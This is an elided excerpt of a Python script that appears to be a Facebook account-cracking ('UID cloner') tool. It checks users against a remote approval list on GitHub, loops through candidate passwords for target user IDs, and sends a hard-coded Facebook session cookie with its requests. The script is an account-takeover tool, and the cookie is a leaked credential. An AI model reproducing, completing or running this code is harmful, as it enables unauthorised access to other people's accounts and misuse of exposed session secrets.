...
def Main():
	...
	print("\033[97;1m  ❥ 3 ‣  𝐁𝐃 𝐔𝐈𝐃 ??𝐥𝐨𝐧𝐞𝐫 \033[1;32m 𝐏𝐑𝐎 ")
...
def hoga_check():
  ...
  try: 
    httpCaht = requests.get("https://raw.githubusercontent.com/jahid-gst/JAHID-KING/main/Apruval.txt").text 
    if id in httpCaht: 
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'cookie': 'datr=a9v7Y_t202w1usD_4gFkd7I-; sb=a9v7Y5mzj2Ay7a7_zfzatSnM; locale=en_US; zsh=ASQchAR4GVpC5Arg6eeonC7RYcKQ8Spr7NpaSAP5aIOzQfifJbM-yUzbEf6in-5sZOOv_BEB-Kg7d6dhHBqkXU-Lgpv1reEpcP72sXyPvyHC22xu6EOP88xX3lIm7i7rNjqipBmz3lYOv3oGRYMP-BpDRUTuPhPU_xCXQJKF4y8daBp8zOl-YhEKQshcM2IBcigkdL74cAsUl7a7atK_psDusbz_hA5akjZJmfOHsF410s55ftRhK8JXE3vVGj2h92bzSwDEDWFJtwrMI7smu4wcSpS-8Q5q0YHGfeGRRbFR2kxeYQkDzFZfh3YAAR95fY3jfdYA; m_pixel_ratio=2.75; wd=393x767; fr=0PWpOGKcJUDKnaLwQ.AWXtPssIrJUzroKaRS0F6xoPrbY.Bj-9tr.Vn.GQB.0.0.BkBPnU.AWXobgQ48IY',
